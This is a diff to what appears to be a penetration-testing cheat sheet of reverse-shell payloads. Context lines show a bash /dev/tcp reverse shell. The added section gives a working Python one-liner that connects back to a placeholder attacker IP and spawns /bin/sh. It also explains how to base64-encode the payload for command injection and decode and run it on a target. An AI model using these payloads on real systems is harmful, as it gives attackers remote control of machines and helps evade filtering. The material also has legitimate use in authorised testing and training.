@@ -461,6 +461,17 @@ bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
 * Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
 * Works on systems with bash and `/dev/tcp` support (most Linux systems)
 
+### Python Reverse Shell (Base64 Encoded)
+
+* **Python reverse shell (base64-encoded)** - Encodes the payload to avoid quoting/special-character issues during command injection
+
+```bash
+echo 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"'' | base64 -w 0
+```
+
+* Generate the base64 payload on the attacker machine
+* Execute on target with: `echo <BASE64_STRING> | base64 -d | sh`
+
 ### Msfvenom JSP WAR Reverse Shell
 
 * **Msfvenom JSP/WAR reverse shell** - Builds a `.war` web archive containing a JSP reverse TCP payload (e.g. Tomcat deployment)
